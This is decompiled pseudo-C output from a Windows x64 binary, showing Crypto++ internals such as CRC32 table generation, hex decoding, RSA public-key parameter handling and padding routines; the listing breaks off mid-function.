//----- (000000014008BEC0) ----------------------------------------------------
_QWORD *__fastcall sub_14008BEC0(void *Dst)
{
  _QWORD *v1; // rsi
  size_t v2; // rbx
  _QWORD *v3; // rax
  _BYTE *v4; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  unsigned __int64 v8; // [rsp+40h] [rbp-18h]

  v1 = Dst;
  v2 = 0i64;
  v3 = sub_14008A6D0(&Src);
  v4 = v3;
  if ( v3[3] >= 0x10ui64 )
    v4 = (_BYTE *)*v3;
  if ( v8 >= 0x10 )
    operator delete(Src);
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Src) = 0;
  v1[3] = 15i64;
  v1[2] = 0i64;
  *(_BYTE *)v1 = 0;
  if ( *v4 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v4[v2] );
  }
  sub_140004F20(v1, v4, v2);
  return v1;
}

//----- (000000014008BF80) ----------------------------------------------------
_QWORD *__fastcall sub_14008BF80(_QWORD *a1)
{
  _QWORD *v1; // rbx

  a1[3] = 15i64;
  a1[2] = 0i64;
  v1 = a1;
  *(_BYTE *)a1 = 0;
  sub_140004F20(a1, &unk_1400AAB58, 3ui64);
  return v1;
}

//----- (000000014008BFC0) ----------------------------------------------------
_QWORD *__fastcall sub_14008BFC0(void *Dst)
{
  _QWORD *v1; // rsi
  size_t v2; // rbx
  _QWORD *v3; // rax
  _BYTE *v4; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  unsigned __int64 v8; // [rsp+40h] [rbp-18h]

  v1 = Dst;
  v2 = 0i64;
  v3 = sub_14008AFC0(&Src);
  v4 = v3;
  if ( v3[3] >= 0x10ui64 )
    v4 = (_BYTE *)*v3;
  if ( v8 >= 0x10 )
    operator delete(Src);
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Src) = 0;
  v1[3] = 15i64;
  v1[2] = 0i64;
  *(_BYTE *)v1 = 0;
  if ( *v4 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v4[v2] );
  }
  sub_140004F20(v1, v4, v2);
  return v1;
}

//----- (000000014008C080) ----------------------------------------------------
_QWORD *__fastcall sub_14008C080(void *Dst)
{
  _QWORD *v1; // rsi
  size_t v2; // rbx
  _QWORD *v3; // rax
  _BYTE *v4; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  unsigned __int64 v8; // [rsp+40h] [rbp-18h]

  v1 = Dst;
  v2 = 0i64;
  v3 = sub_14008B190(&Src);
  v4 = v3;
  if ( v3[3] >= 0x10ui64 )
    v4 = (_BYTE *)*v3;
  if ( v8 >= 0x10 )
    operator delete(Src);
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Src) = 0;
  v1[3] = 15i64;
  v1[2] = 0i64;
  *(_BYTE *)v1 = 0;
  if ( *v4 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v4[v2] );
  }
  sub_140004F20(v1, v4, v2);
  return v1;
}

//----- (000000014008C140) ----------------------------------------------------
__int64 sub_14008C140()
{
  unsigned int v0; // ecx
  _DWORD *v1; // rdx
  unsigned int v2; // eax
  unsigned int v3; // eax
  unsigned int v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // eax
  unsigned int v8; // eax
  __int64 result; // rax

  v0 = 256;
  v1 = &unk_1400DD54C;
  do
  {
    v2 = v0 >> 1;
    if ( v0 & 1 )
      v2 ^= 0xEDB88320;
    if ( v2 & 1 )
      v3 = (v2 >> 1) ^ 0xEDB88320;
    else
      v3 = v2 >> 1;
    if ( v3 & 1 )
      v4 = (v3 >> 1) ^ 0xEDB88320;
    else
      v4 = v3 >> 1;
    if ( v4 & 1 )
      v5 = (v4 >> 1) ^ 0xEDB88320;
    else
      v5 = v4 >> 1;
    if ( v5 & 1 )
      v6 = (v5 >> 1) ^ 0xEDB88320;
    else
      v6 = v5 >> 1;
    if ( v6 & 1 )
      v7 = (v6 >> 1) ^ 0xEDB88320;
    else
      v7 = v6 >> 1;
    if ( v7 & 1 )
      v8 = (v7 >> 1) ^ 0xEDB88320;
    else
      v8 = v7 >> 1;
    if ( v8 & 1 )
      result = (v8 >> 1) ^ 0xEDB88320;
    else
      result = v8 >> 1;
    *v1 = result;
    --v1;
    --v0;
  }
  while ( (signed __int64)v1 >= (signed __int64)dword_1400DD150 );
  byte_1400DD140 = 1;
  return result;
}
// 1400DD140: using guessed type char byte_1400DD140;

//----- (000000014008C1F0) ----------------------------------------------------
__int64 __fastcall sub_14008C1F0(unsigned __int8 *a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ebx
  __int64 v4; // rsi
  unsigned __int8 *v5; // rdi
  __int64 v6; // rdx
  __int64 v7; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( a1 && a2 )
  {
    if ( !byte_1400DD140 )
      sub_14008C140();
    if ( (_DWORD)v4 )
    {
      v6 = v4;
      do
      {
        v7 = *v5++;
        v3 = (v3 >> 8) ^ dword_1400DD150[v7 ^ (unsigned __int8)v3];
        --v6;
      }
      while ( v6 );
    }
    v3 = ~v3;
  }
  return v3;
}
// 1400DD140: using guessed type char byte_1400DD140;

//----- (000000014008C270) ----------------------------------------------------
__int64 __fastcall sub_14008C270(_BYTE *a1, unsigned int a2, _QWORD *a3, _DWORD *a4)
{
  unsigned int v4; // er11
  _DWORD *v5; // r14
  _QWORD *v6; // r15
  __int64 v7; // rsi
  _BYTE *v8; // rbp
  char *v9; // rbx
  int v10; // edi
  unsigned __int8 v11; // al
  int v12; // er10
  __int64 result; // rax
  __int64 v14; // rdi
  char *v15; // rax
  char *v16; // r10
  char *v17; // rdx
  char *v18; // r8
  char v19; // cl
  char v20; // al

  v4 = 0;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  v9 = a1;
  v10 = 0;
  do
  {
    ++v10;
    v11 = 16 * *v9;
    v12 = v9[1] & 0xF;
    v9 += 2;
    v4 = (v4 << 8) | v11 | v12;
  }
  while ( (unsigned __int64)v10 < 4 );
  if ( (unsigned int)v7 < v4 )
    return 0i64;
  v14 = v4;
  v15 = (char *)operator new(v4);
  v16 = v15;
  v17 = v15;
  if ( v9 != &v8[v7] )
  {
    v18 = &v15[v14];
    do
    {
      if ( v17 == v18 )
        break;
      v19 = v9[1];
      v20 = *v9;
      v9 += 2;
      *(++v17 - 1) = 16 * v20 | v19 & 0xF;
    }
    while ( v9 != &v8[v7] );
  }
  *v6 = v16;
  result = (unsigned int)((_DWORD)v9 - (_DWORD)v8);
  *v5 = (_DWORD)v17 - (_DWORD)v16;
  return result;
}

//----- (000000014008C350) ----------------------------------------------------
__int64 __fastcall sub_14008C350(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, _BYTE *a8, unsigned __int64 a9)
{
  _BYTE *v9; // rbx
  _BYTE *v10; // r15
  char *v11; // rdi

  v9 = a8;
  if ( a9 & 7 )
  {
    *a8 = 0;
    v9 = a8 + 1;
  }
  *v9 = 1;
  v10 = &v9[(a9 >> 3) - (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)a5 + 56i64))(a5)];
  v11 = &v10[-*(_QWORD *)(a6 + 8)];
  memset(v9 + 1, 255, v11 - 1 - (v9 + 1));
  *(v11 - 1) = 0;
  memcpy(v11, *(const void **)a6, *(_QWORD *)(a6 + 8));
  return (*(__int64 (__fastcall **)(__int64, _BYTE *))(*(_QWORD *)a5 + 40i64))(a5, v10);
}

//----- (000000014008C400) ----------------------------------------------------
__int64 __fastcall sub_14008C400(__int64 a1, unsigned __int8 *a2, __int64 a3)
{
  __int64 v3; // rsi
  unsigned __int8 *v4; // rdi
  __int64 v5; // rbx
  size_t v6; // r8
  _QWORD *v7; // rax
  unsigned __int8 *v8; // rax
  int v9; // ecx
  int v10; // edx
  __int64 v11; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( *(_BYTE *)(a1 + 33) )
  {
    if ( *a2 )
    {
      v6 = -1i64;
      do
        ++v6;
      while ( a2[v6] );
    }
    else
    {
      v6 = 0i64;
    }
    v7 = sub_140004CA0(*(void **)(a1 + 24), a2, v6);
    sub_140004CA0(v7, &unk_1400AB2F0, 1ui64);
  }
  if ( !*(_BYTE *)(v5 + 32) )
  {
    v8 = v4;
    do
    {
      v9 = v8[*(_QWORD *)(v5 + 8) - (_QWORD)v4];
      v10 = *v8 - v9;
      if ( *v8 != v9 )
        break;
      ++v8;
    }
    while ( v9 );
    if ( !v10 )
    {
      sub_1400293A0(v4, (__int64)&CryptoPP::cls_097 `RTTI Type Descriptor', *(_QWORD *)(v5 + 16));
      v11 = (*(__int64 (__fastcall **)(signed __int64))v3)(
              *(_QWORD *)v5
            + *(signed int *)(*(signed int *)(v3 + 12) + *(_QWORD *)(*(_QWORD *)v5 + 16i64))
            + *(signed int *)(v3 + 8)
            + 16i64);
      sub_14003C670(*(_QWORD *)(v5 + 24), v11);
      *(_BYTE *)(v5 + 32) = 1;
    }
  }
  return v5;
}

//----- (000000014008C4E0) ----------------------------------------------------
signed __int64 *__fastcall sub_14008C4E0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rdi
  signed __int64 *v5; // rbx
  void *v6; // rdx
  char v8; // [rsp+20h] [rbp-B8h]
  __int64 v9; // [rsp+30h] [rbp-A8h]
  void *Memory; // [rsp+38h] [rbp-A0h]
  __int64 v11; // [rsp+48h] [rbp-90h]
  char v12; // [rsp+50h] [rbp-88h]
  __int64 v13; // [rsp+60h] [rbp-78h]
  __int64 v14; // [rsp+68h] [rbp-70h]
  __int64 (__fastcall **v15)(void *); // [rsp+70h] [rbp-68h]
  int v16; // [rsp+88h] [rbp-50h]
  char Dst; // [rsp+90h] [rbp-48h]
  __int64 v18; // [rsp+A0h] [rbp-38h]
  __int64 v19; // [rsp+A8h] [rbp-30h]

  v11 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = (signed __int64 *)a1;
  if ( !*(_BYTE *)(a1 + 16) )
  {
    sub_14003C210(&v8);
    if ( !(*(unsigned __int8 (__fastcall **)(signed __int64, __int64, void *, char *))(*(_QWORD *)v5[1] + 8i64))(
            v5[1],
            v4,
            &CryptoPP::cls_097 `RTTI Type Descriptor',
            &v8) )
    {
      v14 = 15i64;
      v13 = 0i64;
      v12 = 0;
      sub_140004F20(&v12, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v15);
      v15 = &off_1400A8798;
      v16 = 1;
      v19 = 15i64;
      v18 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v12, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v15 = &off_1400A8798;
      CxxThrowException(&v15, &_TI3_AVcls_001_CryptoPP__);
    }
    (*(void (__fastcall **)(signed __int64, char *))v3)(
      *(signed int *)(v3 + 8) + 16i64 + *v5 + *(signed int *)(*(signed int *)(v3 + 12) + *(_QWORD *)(*v5 + 16)),
      &v8);
    v6 = Memory;
    memset(Memory, 0, 8 * v9);
    free(v6);
  }
  return v5;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (000000014008C650) ----------------------------------------------------
__int64 __fastcall sub_14008C650(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  char *v4; // rax
  _QWORD *v5; // rax
  _QWORD *v6; // rdx
  unsigned __int8 v7; // bl
  void *v9; // [rsp+28h] [rbp-50h]
  __int64 v10; // [rsp+38h] [rbp-40h]
  unsigned __int64 v11; // [rsp+40h] [rbp-38h]
  void *v12; // [rsp+48h] [rbp-30h]
  __int64 v13; // [rsp+58h] [rbp-20h]
  unsigned __int64 v14; // [rsp+60h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  v11 = 15i64;
  v10 = 0i64;
  LOBYTE(v9) = 0;
  sub_140004F20(&v9, "ThisObject:", 0xBui64);
  v4 = (char *)type_info::_name_internal_method(
                 (type_info *)&CryptoPP::cls_105 `RTTI Type Descriptor',
                 (struct __type_info_node *)&unk_1400DC648);
  v5 = sub_14000DAC0(&v12, &v9, v4);
  v6 = v5;
  if ( v5[3] >= 0x10ui64 )
    v6 = (_QWORD *)*v5;
  v7 = (*(__int64 (__fastcall **)(__int64, _QWORD *, void *, __int64, signed __int64))(*(_QWORD *)v3 + 8i64))(
         v3,
         v6,
         &CryptoPP::cls_105 `RTTI Type Descriptor',
         v2,
         -2i64);
  if ( v14 >= 0x10 )
    operator delete(v12);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(v12) = 0;
  if ( v11 >= 0x10 )
    operator delete(v9);
  return v7;
}
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);

//----- (000000014008C750) ----------------------------------------------------
__int64 __fastcall sub_14008C750(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6)
{
  __int64 v6; // r13
  __int64 v7; // rbx
  __int64 v8; // rbp
  char *v9; // rdi
  _QWORD *v10; // rdi
  char *v11; // rax
  size_t v12; // r8
  _QWORD *v13; // rax
  _QWORD *v14; // rdi
  size_t v15; // r8
  unsigned __int64 v16; // rsi
  unsigned __int64 v17; // rax
  _QWORD *v18; // rax
  bool v19; // cf
  unsigned __int8 *v20; // rdi
  const char *v21; // rax
  unsigned __int8 *v22; // rdx
  signed __int64 v23; // rax
  int v24; // er8
  int v25; // er9

  *(_QWORD *)a1 = a2;
  v6 = a2;
  v7 = a1;
  *(_QWORD *)(a1 + 8) = a3;
  *(_QWORD *)(a1 + 16) = a4;
  *(_QWORD *)(a1 + 24) = a5;
  *(_WORD *)(a1 + 32) = 0;
  v8 = a4;
  v9 = (char *)a3;
  if ( strcmp(a3, "ValueNames") )
    goto LABEL_26;
  *(_WORD *)(v7 + 32) = 257;
  sub_1400293A0(
    v9,
    (__int64)&std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor',
    v8);
  if ( a6 )
    (*(void (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(a6, *(_QWORD *)(v7 + 8), v8, a5);
  if ( (unsigned __int8)type_info::operator!=(
                          &CryptoPP::cls_105 `RTTI Type Descriptor',
                          &CryptoPP::cls_105 `RTTI Type Descriptor') )
    sub_14008CE90(v6 + 104, *(_QWORD *)(v7 + 8), v8, (__int64)a5);
  v10 = sub_140004CA0(*(void **)(v7 + 24), "ThisPointer:", 0xCui64);
  v11 = (char *)type_info::_name_internal_method(
                  (type_info *)&CryptoPP::cls_105 `RTTI Type Descriptor',
                  (struct __type_info_node *)&unk_1400DC648);
  if ( *v11 )
  {
    v12 = -1i64;
    do
      ++v12;
    while ( v11[v12] );
  }
  else
  {
    v12 = 0i64;
  }
  v13 = sub_140004CA0(v10, v11, v12);
  v14 = v13;
  v15 = v13[2];
  if ( -1i64 - v15 <= 1 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v16 = v15 + 1;
  if ( v15 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v17 = v13[3];
  if ( v17 < v16 )
  {
    sub_140004790(v14, v16, v15);
    if ( !v16 )
      goto LABEL_26;
    goto LABEL_16;
  }
  if ( v16 )
  {
LABEL_16:
    if ( v14[3] < 0x10ui64 )
      v18 = v14;
    else
      v18 = (_QWORD *)*v14;
    *((_BYTE *)v18 + v14[2]) = 59;
    v19 = v14[3] < 0x10ui64;
    v14[2] = v16;
    if ( !v19 )
      v14 = (_QWORD *)*v14;
    *((_BYTE *)v14 + v16) = 0;
    goto LABEL_26;
  }
  v14[2] = 0i64;
  if ( v17 >= 0x10 )
    v14 = (_QWORD *)*v14;
  *(_BYTE *)v14 = 0;
LABEL_26:
  if ( !*(_BYTE *)(v7 + 32) )
  {
    if ( strncmp(*(const char **)(v7 + 8), "ThisPointer:", 0xCui64) )
      goto LABEL_42;
    v20 = *(unsigned __int8 **)(v7 + 8);
    v21 = type_info::_name_internal_method(
            (type_info *)&CryptoPP::cls_105 `RTTI Type Descriptor',
            (struct __type_info_node *)&unk_1400DC648);
    v22 = v20 + 12;
    v23 = v21 - (const char *)(v20 + 12);
    do
    {
      v24 = v22[v23];
      v25 = *v22 - v24;
      if ( *v22 != v24 )
        break;
      ++v22;
    }
    while ( v24 );
    if ( v25 )
    {
LABEL_42:
      if ( !*(_BYTE *)(v7 + 32) )
      {
        if ( a6 )
          *(_BYTE *)(v7 + 32) = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
                                  a6,
                                  *(_QWORD *)(v7 + 8),
                                  v8,
                                  a5);
        if ( !*(_BYTE *)(v7 + 32)
          && (unsigned __int8)type_info::operator!=(
                                &CryptoPP::cls_105 `RTTI Type Descriptor',
                                &CryptoPP::cls_105 `RTTI Type Descriptor') )
        {
          *(_BYTE *)(v7 + 32) = sub_14008CE90(v6 + 104, *(_QWORD *)(v7 + 8), v8, (__int64)a5);
        }
      }
    }
    else
    {
      sub_1400293A0(v20, (__int64)&CryptoPP::cls_105 * `RTTI Type Descriptor', *(_QWORD *)(v7 + 16));
      *a5 = v6;
      *(_BYTE *)(v7 + 32) = 1;
    }
  }
  return v7;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);
// 1400D8E00: using guessed type void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor')(type_info *this, unsigned int);
// 1400D9630: using guessed type struct CryptoPP::cls_105 *CryptoPP::cls_105 * `RTTI Type Descriptor';

//----- (000000014008C9F0) ----------------------------------------------------
void *__fastcall sub_14008C9F0(__int64 a1, void *a2, __int64 a3)
{
  __int64 v3; // rbp
  void *v4; // r14
  __int64 v5; // rbx
  __int64 v6; // rsi
  __int64 v7; // rdi
  __int64 v8; // rax

  v3 = a3;
  v4 = a2;
  v5 = *(signed int *)(*(_QWORD *)(a1 + 16) + 4i64);
  v6 = a1;
  v7 = *(_QWORD *)(v5 + a1 + 16);
  v8 = sub_140039EF0(a1);
  (*(void (__fastcall **)(__int64, __int64, _QWORD))(v7 + 32))(v5 + v6 + 16, v8, 0i64);
  sub_14004C4D0(v4, v3, v6 + 64, v6 + 24);
  return v4;
}
// 140039EF0: using guessed type __int64 __cdecl sub_140039EF0(_QWORD);

//----- (000000014008CA70) ----------------------------------------------------
signed __int64 *__fastcall sub_14008CA70(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  signed __int64 v3; // rdi
  signed __int64 *v4; // rax
  __m128i v6; // [rsp+20h] [rbp-48h]
  __m128i v7; // [rsp+30h] [rbp-38h]
  __int64 v8; // [rsp+40h] [rbp-28h]
  __int64 v9; // [rsp+48h] [rbp-20h]
  char v10; // [rsp+50h] [rbp-18h]

  v2 = a2;
  v3 = a1 - 104;
  v6.m128i_i64[0] = (__int64)sub_14008CF50;
  v6.m128i_i64[1] = 4294967280i64;
  _mm_store_si128(&v6, v6);
  v7.m128i_i64[0] = (__int64)sub_14008CF40;
  v7.m128i_i64[1] = 4294967280i64;
  v10 = 0;
  _mm_store_si128(&v7, v7);
  v8 = a1 - 104;
  v9 = a2;
  if ( (unsigned __int8)sub_14008C650(a2, a1 - 104) )
  {
    v10 = 1;
  }
  else if ( (unsigned __int8)type_info::operator!=(
                               &CryptoPP::cls_105 `RTTI Type Descriptor',
                               &CryptoPP::cls_105 `RTTI Type Descriptor') )
  {
    sub_14008CA70(v3 + 104, v2);
  }
  v4 = sub_14008C4E0((__int64)&v8, (__int64)"Modulus", (__int64)&v7);
  return sub_14008C4E0((__int64)v4, (__int64)"PublicExponent", (__int64)&v6);
}
// 14008CF40: using guessed type __int64 __fastcall sub_14008CF40();
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);

//----- (000000014008CB50) ----------------------------------------------------
__int64 *__fastcall sub_14008CB50(__int64 *a1)
{
  __int64 *v1; // rsi
  _QWORD *v2; // rbx
  char *v3; // rax
  size_t v4; // r8
  _QWORD *v5; // rax
  _QWORD *v6; // rbx
  size_t v7; // r8
  unsigned __int64 v8; // rdi
  unsigned __int64 v9; // rax
  _QWORD *v10; // rax
  bool v11; // cf
  unsigned __int8 *v12; // rbx
  const char *v13; // rax
  unsigned __int8 *v14; // r8
  signed __int64 v15; // rax
  int v16; // er9
  int v17; // er10
  __int64 v18; // rbx
  __int64 v19; // rdi

  v1 = a1;
  if ( !*((_BYTE *)a1 + 33) )
    goto LABEL_22;
  v2 = sub_140004CA0((void *)a1[3], "ThisObject:", 0xBui64);
  v3 = (char *)type_info::_name_internal_method(
                 (type_info *)&CryptoPP::cls_105 `RTTI Type Descriptor',
                 (struct __type_info_node *)&unk_1400DC648);
  if ( *v3 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( v3[v4] );
  }
  else
  {
    v4 = 0i64;
  }
  v5 = sub_140004CA0(v2, v3, v4);
  v6 = v5;
  v7 = v5[2];
  if ( -1i64 - v7 <= 1 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v8 = v7 + 1;
  if ( v7 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v9 = v5[3];
  if ( v9 < v8 )
  {
    sub_140004790(v6, v8, v7);
    if ( !v8 )
      goto LABEL_22;
    goto LABEL_12;
  }
  if ( v8 )
  {
LABEL_12:
    if ( v6[3] < 0x10ui64 )
      v10 = v6;
    else
      v10 = (_QWORD *)*v6;
    *((_BYTE *)v10 + v6[2]) = 59;
    v11 = v6[3] < 0x10ui64;
    v6[2] = v8;
    if ( !v11 )
      v6 = (_QWORD *)*v6;
    *((_BYTE *)v6 + v8) = 0;
    goto LABEL_22;
  }
  v6[2] = 0i64;
  if ( v9 >= 0x10 )
    v6 = (_QWORD *)*v6;
  *(_BYTE *)v6 = 0;
LABEL_22:
  if ( !*((_BYTE *)v1 + 32) && !strncmp((const char *)v1[1], "ThisObject:", 0xBui64) )
  {
    v12 = (unsigned __int8 *)v1[1];
    v13 = type_info::_name_internal_method(
            (type_info *)&CryptoPP::cls_105 `RTTI Type Descriptor',
            (struct __type_info_node *)&unk_1400DC648);
    v14 = v12 + 11;
    v15 = v13 - (const char *)(v12 + 11);
    do
    {
      v16 = v14[v15];
      v17 = *v14 - v16;
      if ( *v14 != v16 )
        break;
      ++v14;
    }
    while ( v16 );
    if ( !v17 )
    {
      sub_1400293A0(v12, (__int64)&CryptoPP::cls_105 `RTTI Type Descriptor', v1[2]);
      v18 = *v1;
      v19 = v1[3];
      sub_14003C670(v19 + 24, *v1 + 24);
      sub_14003C670(v19 + 64, v18 + 64);
      *((_BYTE *)v1 + 32) = 1;
    }
  }
  return v1;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);

//----- (000000014008CD10) ----------------------------------------------------
__int64 __fastcall sub_14008CD10(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 (__fastcall **v4)(void *); // [rsp+30h] [rbp-58h]
  __int64 (__fastcall **v5)(); // [rsp+38h] [rbp-50h]

  v2 = a1;
  sub_14005F770((__int64)&v4, a2, 48);
  v4 = &off_1400A9AC0;
  v5 = &off_1400ACF80;
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)(v2 + 16) + 8i64))(v2 + 16, &v4);
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)(v2 + 56) + 8i64))(v2 + 56, &v4);
  sub_140060990((__int64)&v4);
  return sub_14005F840(&v4);
}
// 14005F840: using guessed type __int64 __fastcall sub_14005F840(_QWORD);
// 1400A9AC0: using guessed type __int64 (__fastcall *off_1400A9AC0)(void *);
// 1400ACF80: using guessed type __int64 (__fastcall *off_1400ACF80)();

//----- (000000014008CDB0) ----------------------------------------------------
void __fastcall sub_14008CDB0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 (__fastcall **v3)(void *); // [rsp+30h] [rbp-78h]
  __int64 (__fastcall **v4)(); // [rsp+38h] [rbp-70h]

  v2 = a1;
  sub_14005F7E0((__int64)&v3, a2, 48);
  v3 = &off_1400A9C28;
  v4 = &off_1400ACF98;
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)(v2 + 16) + 16i64))(v2 + 16, &v3);
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)(v2 + 56) + 16i64))(v2 + 56, &v3);
  sub_1400609E0((__int64)&v3);
  sub_14005F8B0((__int64)&v3);
}
// 1400A9C28: using guessed type __int64 (__fastcall *off_1400A9C28)(void *);
// 1400ACF98: using guessed type __int64 (__fastcall *off_1400ACF98)();

//----- (000000014008CE50) ----------------------------------------------------
void **__fastcall sub_14008CE50(__int64 a1, void **a2)
{
  void **v2; // rbx

  v2 = a2;
  sub_14008D090(a2);
  return v2;
}

//----- (000000014008CE80) ----------------------------------------------------
signed __int64 __fastcall sub_14008CE80(__int64 a1)
{
  return a1 + 24;
}

//----- (000000014008CE90) ----------------------------------------------------
__int64 __fastcall sub_14008CE90(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rax
  __int64 v5; // rax
  __m128i v7; // [rsp+30h] [rbp-58h]
  __m128i v8; // [rsp+40h] [rbp-48h]
  char v9; // [rsp+50h] [rbp-38h]

  v7.m128i_i64[0] = (__int64)sub_140027A40;
  v7.m128i_i64[1] = 4294967280i64;
  _mm_store_si128(&v7, v7);
  v8.m128i_i64[0] = (__int64)sub_14008CE80;
  v8.m128i_i64[1] = 4294967280i64;
  _mm_store_si128(&v8, v8);
  sub_14008C750((__int64)&v9, a1 - 104, (const char *)a2, a3, (_QWORD *)a4, 0i64);
  v4 = sub_14008CB50((__int64 *)&v9);
  v5 = sub_14008C400((__int64)v4, "Modulus", (__int64)&v8);
  return *(unsigned __int8 *)(sub_14008C400(v5, "PublicExponent", (__int64)&v7) + 32);
}

//----- (000000014008CF50) ----------------------------------------------------
__int64 __fastcall sub_14008CF50(__int64 a1, __int64 a2)
{
  return sub_14003C670(a1 + 64, a2);
}

//----- (000000014008CF60) ----------------------------------------------------
bool __fastcall sub_14008CF60(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax
  __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rbx
  bool result; // al

  v1 = a1;
  v2 = sub_140049E30();
  v3 = v1 - 80;
  result = 0;
  if ( (signed int)sub_140045A60(v1 - 80, v2) > 0 && sub_140048010(v1 - 80, 0i64) == 1 )
  {
    v4 = sub_140049E30();
    v5 = v1 - 40;
    if ( (signed int)sub_140045A60(v5, v4) > 0 && sub_140048010(v5, 0i64) == 1 && (signed int)sub_140045A60(v5, v3) < 0 )
      result = 1;
  }
  return result;
}

//----- (000000014008CFF0) ----------------------------------------------------
void **__fastcall sub_14008CFF0(void **a1)
{
  void **v1; // rbx
  void **v2; // rax
  void *v4; // [rsp+30h] [rbp-28h]

  v1 = a1;
  v2 = sub_14008D0E0(&v4);
  sub_14003D080(v1, (const void **)v2, 1);
  if ( v4 )
    operator delete(v4);
  return v1;
}

//----- (000000014008D040) ----------------------------------------------------
void **__fastcall sub_14008D040(void **a1)
{
  void **v1; // rbx
  void **v2; // rax
  void *v4; // [rsp+30h] [rbp-28h]

  v1 = a1;
  v2 = sub_14008CFF0(&v4);
  sub_14003D080(v1, (const void **)v2, 1);
  if ( v4 )
    operator delete(v4);
  return v1;
}

//----- (000000014008D090) ----------------------------------------------------
void **__fastcall sub_14008D090(void **a1)
{
  void **v1; // rbx
  void **v2; // rax
  void *v4; // [rsp+30h] [rbp-28h]

  v1 = a1;
  v2 = sub_14008D040(&v4);
  sub_14003D080(v1, (const void **)v2, 1);
  if ( v4 )
    operator delete(v4);
  return v1;
}

//----- (000000014008D0E0) ----------------------------------------------------
void **__fastcall sub_14008D0E0(void **a1)
{
  void **v1; // rbx
  void **v2; // rax
  void *v4; // [rsp+30h] [rbp-28h]

  v1 = a1;
  v2 = sub_14004C5E0(&v4);
  sub_14003D080(v1, (const void **)v2, 113549);
  if ( v4 )
    operator delete(v4);
  return v1;
}

//----- (000000014008D130) ----------------------------------------------------
__int64 __fastcall sub_14008D130(__int64 a1, _DWORD *a2, int *a3, int *a4)
{
  __int64 v4; // rsi
  _DWORD *v5; // rbp
  int v6; // ebx
  unsigned int v7; // er13
  int *v8; // r15
  int *v9; // r14
  int v10; // er9
  int v11; // er8
  unsigned int v12; // er12
  int v13; // edi
  int v14; // er9
  int v15; // er8
  unsigned int v16; // er13
  int v17; // er10
  int v18; // er9
  int v19; // er8
  unsigned int v20; // er12
  int v21; // er11
  int v22; // er9
  int v23; // er8
  unsigned int v24; // er13
  int v25; // ebx
  int v26; // er9
  int v27; // er8
  unsigned int v28; // er12
  int v29; // er10
  int v30; // er9
  int v31; // er8
  unsigned int v32; // er13
  int v33; // er11
  int v34; // er9
  int v35; // er8
  unsigned int v36; // er12
  int v37; // ebx
  int v38; // er9
  int v39; // er8
